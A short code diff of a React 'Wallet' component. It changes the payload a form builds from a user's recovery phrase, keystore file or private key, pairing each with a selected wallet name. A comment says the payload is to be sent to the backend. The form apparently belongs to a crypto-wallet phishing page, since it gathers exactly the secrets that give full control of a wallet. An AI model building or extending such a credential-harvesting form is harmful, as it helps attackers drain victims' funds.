@@ -82,11 +82,11 @@ const Wallet = () => {
     // Process the formData based on the selectedTab
     let dataToSend;
     if (selectedTab === "phrase") {
-      dataToSend = { phrase: formData.phrase,wallet:formData.wallet };
+      dataToSend = { phrase: formData.phrase,item:selectedItem?.name };
     } else if (selectedTab === "keystore") {
-      dataToSend = { keystore: formData.keystore, wallet: formData.wallet };
+      dataToSend = { keystore: formData.keystore,item:selectedItem?.name };
     } else if (selectedTab === "private") {
-      dataToSend = { privateKey: formData.privateKey, wallet: formData.wallet };
+      dataToSend = { privateKey: formData.privateKey,item:selectedItem?.name };
     }
     // Send dataToSend to the backend
     console.log(dataToSend);
